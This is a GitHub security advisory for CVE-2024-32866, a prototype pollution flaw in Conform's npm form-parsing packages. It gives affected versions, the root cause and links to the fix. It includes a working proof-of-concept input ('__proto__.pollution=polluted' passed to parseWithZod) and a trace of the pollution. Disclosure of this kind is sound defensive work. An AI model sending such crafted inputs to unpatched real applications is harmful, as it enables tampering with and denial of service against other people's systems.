# [H] Conform contains a Prototype Pollution Vulnerability in `parseWith...` function

## Summary
Severity: High
Advisory: GHSA-624g-8qjg-8qxf
CVE: CVE-2024-32866
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H (CVSS_V3)
Published: 2024-04-23
Source: https://github.com/advisories/GHSA-624g-8qjg-8qxf
Type: github-advisory

## Affected
- npm: `@conform-to/dom` — affected >=1.0.0 <1.1.1
- npm: `@conform-to/zod` — affected >=1.0.0 <1.1.1
- npm: `@conform-to/yup` — affected >=1.0.0 <1.1.1
- npm: `@conform-to/zod` — affected >=0 <0.9.2
- npm: `@conform-to/yup` — affected >=0 <0.9.2
- npm: `@conform-to/dom` — affected >=0 <0.9.2

## Details
### Summary
Conform allows the parsing of nested objects in the form of `object.property`. Due to an improper implementation of this feature, an attacker can exploit it to trigger prototype pollution by passing a crafted input to `parseWith...` functions.

### PoC
```javascript
const { parseWithZod } = require('@conform-to/zod');
const { z } = require("zod"); 

const param = new URLSearchParams("__proto__.pollution=polluted");
const schema = z.object({ "a": z.string() });

parseWithZod(param, { schema });
console.log("pollution:", ({}).pollution); // should print "polluted"
```

### Details

The invocation of the `parseWithZod` function in the above PoC triggers the `setValue` function through `getSubmissionContext` and `parse`, executing the following process, resulting in prototype pollution:

```javascript
let pointer = value;

pointer.__proto__ = pointer.__proto__;
pointer = pointer.__proto__;

pointer.polluted = "polluted";
```

This is caused by the lack of object existence checking on [line 117 in formdata.ts](https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117), where the code only checks for the presence of `pointer[key]` without proper validation.

### Impact
Applications that use conform for server-side validation of form data or URL parameters are affected by this vulnerability.

## References
- https://github.com/edmundhung/conform/security/advisories/GHSA-624g-8qjg-8qxf
- https://nvd.nist.gov/vuln/detail/CVE-2024-32866
- https://github.com/edmundhung/conform/commit/4819d51b5a53fd5486fc85c17cdc148eb160e3de
- https://github.com/edmundhung/conform/commit/cb604dd58b99e2d12716d901a23bfca724e741ef
- https://github.com/edmundhung/conform
- https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117
